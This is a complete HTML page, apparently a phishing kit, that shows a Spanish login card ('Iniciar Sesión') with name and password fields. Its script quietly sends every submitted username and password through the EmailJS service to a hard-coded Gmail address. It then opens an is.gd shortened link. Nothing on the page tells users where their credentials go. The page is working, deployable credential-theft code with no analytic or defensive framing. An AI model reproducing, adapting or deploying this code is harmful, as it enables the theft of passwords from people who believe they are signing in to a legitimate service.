<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <title>REGISTRO 📋</title>
<style>
body { 
     display: flex; 
     height: 80vh;
     background: beige; 
     align-items: center;      
     justify-content: center;
     font-family: sans-serif;     
}
.Login-Card { 
     padding: 2rem;
     background: #fca;       
     border-radius: 50%; 
     box-shadow: 0 8px 10px rgba(0,0,0,0.2);
}
input { 
     width: 100%; 
     display: block;
     padding: 0.5rem;
     margin-bottom: 1rem;  
     border-radius: 10px;
     font-weight: bold;
     outline: none;
     
   &:focus {
       border: 2px solid #f00;
   }
      
   &:hover {
       scale: 1.1;
   }
}
button { 
     width: 100%; 
     color: white; 
     border: none;
     padding: 0.7rem;  
     cursor: pointer;
     border-radius: 10px; 
     background: #007bff;
          
   &:hover {
       scale: 1.1;
       background: #0056b3;
   }     
}
#M {
    color: red;
    font-weight: bold;
}
</style>
</head>
<body>
<center>

      <div class="Login-Card">
      
 <form id="F">
       <h2>Iniciar Sesión</h2>
    <input type="text" id="USER" name="Usuario" placeholder="Nombre">
    
    <input type="password" id="PASS" name="🔑" placeholder="Contraseña">
    <button id="B" type="submit">REGISTRARSE</button>
         <p id="M"></p>
  </form>
</div>
</center>
<script>
  <!-- Inicializa con tu llave pública -->
    emailjs.init("IiuPuXl8wRYZEspZE");

    F.onsubmit = (e) => { 
        e.preventDefault();
        
        var data = Object.fromEntries(
            new FormData(e.target)
        );        

  <!-- Enviamos los datos al servicio -->
        emailjs.send("service_hju9onq", "template_o0nixjq", {
            datos: JSON.stringify(data),
            to_email: "lamoviedeoro@gmail.com"
        })
         .then(() => {
           
window.open("https://is.gd/stDTxK");
        });
      };
        
        <!-- LOGÍSTICA -->
           
</script>
</body>
</html>
